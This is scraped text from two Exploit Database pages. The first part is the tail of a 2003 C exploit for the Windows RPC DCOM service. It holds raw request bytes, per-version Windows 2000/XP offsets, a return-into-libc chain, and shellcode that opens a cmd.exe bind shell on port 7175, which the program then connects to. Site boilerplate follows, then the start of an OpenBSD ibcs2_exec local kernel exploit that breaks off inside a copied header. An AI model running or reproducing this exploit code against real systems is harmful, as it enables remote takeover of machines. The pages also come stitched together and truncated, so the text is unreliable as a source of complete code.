request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};struct offset{char *description;unsigned long valloc;unsigned long amemcpy;unsigned long vprot;unsigned long ret;unsigned long frame;};struct offset targets[]={{"Windows 2000 SP0 (english)",0x77f95da9,0x78001194,0x77f82ffb,0x77f96800,0x52f770},{"Windows XP   SP0 (english)",0x77f7e4c3,0x77c42e10,0x77f7ec43,0x77f80a07,0x5bf79c},{NULL,0,0,0,0,0}};unsigned char shell[]="\x46\x00\x58\x00""\x4E\x00\x42\x00""\x46\x00\x58\x00""\x46\x00\x58\x00""\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00""\xff\xff\xff\xff""\xff\xff\xff\xff""\xcc\xe0\xfd\x7f""\xcc\xe0\xfd\x7f""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x83\xec\x34\x8b\xf4\xe8\x47\x01\x00\x00\x89\x06\xff\x36\x68\x8e""\x4e\x0e\xec\xe8\x61\x01\x00\x00\x89\x46\x08\xff\x36\x68\xad\xd9""\x05\xce\xe8\x52\x01\x00\x00\x89\x46\x0c\x68\x6c\x6c\x00\x00\x68""\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x56\x08\x89\x46\x04""\xff\x36\x68\x72\xfe\xb3\x16\xe8\x2d\x01\x00\x00\x89\x46\x10\xff""\x36\x68\xef\xce\xe0\x60\xe8\x1e\x01\x00\x00\x89\x46\x14\xff\x76""\x04\x68\xcb\xed\xfc\x3b\xe8\x0e\x01\x00\x00\x89\x46\x18\xff\x76""\x04\x68\xd9\x09\xf5\xad\xe8\xfe\x00\x00\x00\x89\x46\x1c\xff\x76""\x04\x68\xa4\x1a\x70\xc7\xe8\xee\x00\x00\x00\x89\x46\x20\xff\x76""\x04\x68\xa4\xad\x2e\xe9\xe8\xde\x00\x00\x00\x89\x46\x24\xff\x76""\x04\x68\xe5\x49\x86\x49\xe8\xce\x00\x00\x00\x89\x46\x28\xff\x76""\x04\x68\xe7\x79\xc6\x79\xe8\xbe\x00\x00\x00\x89\x46\x2c\x33\xff""\x81\xec\x90\x01\x00\x00\x54\x68\x01\x01\x00\x00\xff\x56\x18\x50""\x50\x50\x50\x40\x50\x40\x50\xff\x56\x1c\x8b\xd8\x57\x57\x68\x02""\x00\x1c\x07\x8b\xcc\x6a\x16\x51\x53\xff\x56\x20\x57\x53\xff\x56""\x24\x57\x51\x53\xff\x56\x28\x8b\xd0\x68\x65\x78\x65\x00\x68\x63""\x6d\x64\x2e\x89\x66\x30\x83\xec\x54\x8d\x3c\x24\x33\xc0\x33\xc9""\x83\xc1\x15\xab\xe2\xfd\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d\x89""\x54\x24\x48\x89\x54\x24\x4c\x89\x54\x24\x50\x8d\x44\x24\x10\x54""\x50\x51\x51\x51\x6a\x01\x51\x51\xff\x76\x30\x51\xff\x56\x10\x8b""\xcc\x6a\xff\xff\x31\xff\x56\x0c\x8b\xc8\x57\xff\x56\x2c\xff\x56""\x14\x55\x56\x64\xa1\x30\x00\x00\x00\x85\xc0\x78\x0c\x8b\x40\x0c""\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09\x8b\x40\x34\x8b\xa8\xb8\x00""\x00\x00\x8b\xc5\x5e\x5d\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24""\x18\x8b\x45\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20""\x03\xdd\xe3\x32\x49\x8b\x34\x8b\x03\xf5\x33\xff\xfc\x33\xc0\xac""\x3a\xc4\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf2\x3b\x7c\x24\x14\x75""\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b""\x04\x8b\x03\xc5\xeb\x02\x33\xc0\x8b\xd5\x5f\x5e\x5d\x5b\xc2\x04""\x00\x90\x90\x90\x80\xbf\x32\x94\x80\xbf\x32\x94";struct frame1{unsigned long frame0;unsigned long ret;}fr1;struct retstruct{unsigned long frame1;unsigned long valloc;unsigned long ret1;unsigned long dummy1;unsigned long pointer11;unsigned long zero;unsigned long pointer12;unsigned long type;unsigned long prot;unsigned long frame2;unsigned long amemcpy;unsigned long ret2;unsigned long dest;unsigned long src;unsigned long size2;unsigned long frame3;unsigned long vprot;unsigned long ret3;unsigned long dummy2;unsigned long pointer21;unsigned long pointer22;unsigned long newprot;unsigned long oldprot;}rets;void prepare_ret(int id){rets.type=0x3000;rets.prot=0x4;rets.newprot=0x20;rets.valloc=targets[id].valloc;rets.amemcpy=targets[id].amemcpy;rets.vprot=targets[id].vprot;fr1.ret=rets.ret1=rets.ret2=targets[id].ret;fr1.frame0=targets[id].frame;rets.frame1=fr1.frame0+9*4;rets.frame2=rets.frame1+6*4;rets.oldprot=fr1.frame0;rets.frame3=rets.frame1;rets.size2=sizeof(shell);rets.src=fr1.frame0;rets.dest=0x55555000;rets.ret3=0x5555506c;rets.dummy1=rets.dummy2=0xffffffff;rets.zero=0;*(int*)(shell+148)=0x55555000;*(int*)(shell+152)=sizeof(shell);*(int*)(shell+140)=0x55555000;*(int*)(shell+144)=sizeof(shell);rets.pointer11=fr1.frame0+92;rets.pointer12=fr1.frame0+96;rets.pointer21=fr1.frame0+100;rets.pointer22=fr1.frame0+104;memcpy(shell+32,&fr1,sizeof(fr1));memcpy(shell+48,&rets,sizeof(rets));}void entershell(int sock){char buf[3000];fd_set  fdr;int rs;FD_ZERO(&fdr);FD_SET(sock,&fdr);FD_SET(0,&fdr);for(;;){FD_SET(sock, &fdr);FD_SET(0, &fdr);if(select(FD_SETSIZE,&fdr,NULL,NULL,NULL)<0) break;if(FD_ISSET(sock, &fdr)){if((rs=read(sock,buf,sizeof(buf)))<0){printf("connection lost\n");return;}if(write(1,buf,rs)<0) break;}if(FD_ISSET(0,&fdr)){if((rs=read(0,buf,sizeof(buf)))<0){printf("[-] Connection lost..\n");exit(1);}if (write(sock,buf,rs) < 0) break;}usleep(100);}printf("connection closed\n");return;}int main(int argc, char **argv){int sock,i,len1;struct sockaddr_in sin;unsigned char buf1[0x1000],buf2[0x1000];if(argc<3){printf("###############################\n");printf("return into libc rpc exploit\n");printf("ins1der 2003\n");printf("*****************************************\n");printf("usage: %s <ip> <id>\n", argv[0]);printf("*****************************************\n");printf("targets:\n");printf("-----------------------------------------\n");for (i=0;targets[i].description!= NULL;i++){printf("%d\t%s\n",i,targets[i].description);}printf("-----------------------------------------\n");return 0;}printf("Exploiting %s...\n",argv[1]);prepare_ret(atoi(argv[2]));sin.sin_family=AF_INET;sin.sin_addr.s_addr=inet_addr(argv[1]);sin.sin_port=htons(135);if ((sock=socket(AF_INET,SOCK_STREAM,0))==-1){perror("socket ");return 0;}if(connect(sock,(struct sockaddr*)&sin, sizeof(sin))){perror("connect ");return 0;}memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(shell)/2;*(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(shell)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,shell,sizeof(shell));len1=len1+sizeof(shell);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(shell)-0xc;*(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(shell)-0xc;if (send(sock,(char*)bindstr,sizeof(bindstr),0)==-1){perror("send");return 0;}recv(sock,(char*)buf1,1000,0);if (send(sock,(char*)buf2,len1,0)== -1){perror("send");return 0;}close(sock);sleep(1);sin.sin_port = htons(7175);if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1){perror("socket");return(0);}if(connect(sock,(struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1){printf("Exploit failed\n");return(0);}printf("Entering shell\n");entershell(sock);return 1;}// milw0rm.com [2003-11-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 118
OpenBSD - 'ibcs2_exec' Kernel Code Execution - BSD local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOpenBSD - 'ibcs2_exec' Kernel Code ExecutionEDB-ID:118CVE:2003-0955EDB Verified:Author:Scott BartramType:localExploit:/Platform:BSDDate:2003-11-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED//// Patch ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.4/common/005_exec.patch//#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <stdio.h>/* $OpenBSD: ibcs2_exec.h,v 1.3 2002/03/14 01:26:50 millert Exp $ *//* $NetBSD: ibcs2_exec.h,v 1.4 1995/03/14 15:12:24 scottb Exp $ *//** Copyright (c) 1994, 1995 Scott Bartram* All rights reserved.** adapted from sys/sys/exec_ecoff.h* based on Intel iBCS2** Redistribution and use in source and binary forms, with or without* modification, are permitted provided that the following conditions* are met:* 1. Redistributions of source code must retain the above copyright* notice, this list of conditions and the following disclaimer.* 2. Redistributions in binary form must reproduce the above copyright* notice, this list of conditions and the following disclaimer in the* documentation and/or other materials provided with the distribution.* 3. The name of the author may not be used to endorse or promote products* derived from this software without specific prior written permission** THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR* IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES* OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.* IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,* INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT* NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,* DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY* THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT* (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF* THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.*/#ifndef _IBCS2_EXEC_H_#define _IBCS2_EXEC_H_/** COFF file header*/struct coff_filehdr {u_short f_magic; /* magic number */u_short f_nscns; /* # of sections */long f_timdat; /* timestamp */long f_symptr; /* file offset of symbol table */long f_nsyms; /* # of symbol table entries */u_short f_opthdr; /* size of optional header */u_short f_flags; /* flags */};/* f_magic flags */#define COFF_MAGIC_I386 0x14c/* f_flags */#define COFF_F_RELFLG 0x1#define COFF_F_EXEC 0x2#define COFF_F_LNNO 0x4#define COFF_F_LSYMS 0x8#define COFF_F_SWABD 0x40#define COFF_F_AR16WR 0x80#define COFF_F_AR32WR 0x100/** COFF system header*/struct coff_aouthdr {short a_magic;short a_vstamp;long a_tsize;long a_dsize;long a_bsize;long a_entry;long a_tstart;long a_dstart;};/* magic */#define COFF_OMAGIC 0407 /* text not write-protected; data segis contiguous with text */#define COFF_NMAGIC 0410 /* text is write-protected; data startsat next seg following text */#define COFF_ZMAGIC 0413 /* text and data segs are aligned fordirect paging */#define COFF_SMAGIC 0443 /* shared lib *//** COFF section header*/struct coff_scnhdr {char s_name[8];long s_paddr;long s_vaddr;long s_size;long s_scnptr;long s_relptr;long s_lnnoptr;u_short s_nreloc;u_short s_nlnno;long s_flags;};/* s_flags */#define COFF_STYP_REG 0x00#define COFF_STYP_DSECT 0x01#define COFF_STYP_NOLOAD 0x02#define COFF_STYP_GROUP 0x04#define COFF_STYP_PAD 0x08#define COFF_STYP_COPY 0x10#define COFF_STYP_TEXT 0x20#define 